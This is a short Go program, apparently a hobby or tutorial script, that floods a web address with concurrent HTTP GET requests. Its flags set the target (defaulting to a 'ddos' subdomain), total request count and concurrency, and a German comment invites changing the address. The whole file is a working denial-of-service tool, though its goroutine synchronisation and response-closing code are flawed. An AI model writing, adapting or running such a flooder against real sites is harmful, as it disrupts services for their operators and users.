package main

import (
	"flag"
	"log"
	"net/http"
	"sync"
)

func main() {

	// 2 Flags IP und wie viele angriffe, vielleicht muss die adresse geändert werden
	address := flag.String("ip", "http://ddos.networkchuck.com/", "Address to attack")
	totalAttacks := flag.Int("n", 1000, "How many requests you want to send in total")
	concurrentAttacks := flag.Int("c", 50, "How many concurrent requests you want to send")
	flag.Parse()

	var wg sync.WaitGroup
	wg.Add(*totalAttacks)

	attacksPerIteration := *totalAttacks / *concurrentAttacks
	for n := 0; n < *concurrentAttacks; n++ {
		go func() {
			for i := 0; i < attacksPerIteration; i++ {
				resp, err := http.Get(*address)
				if err != nil {
					log.Println(err)
				}

				defer func() {
					if resp != nil {
						resp.Body.Close()
					}
				}()

				wg.Done()
			}
		}()
	}

	wg.Wait()
}
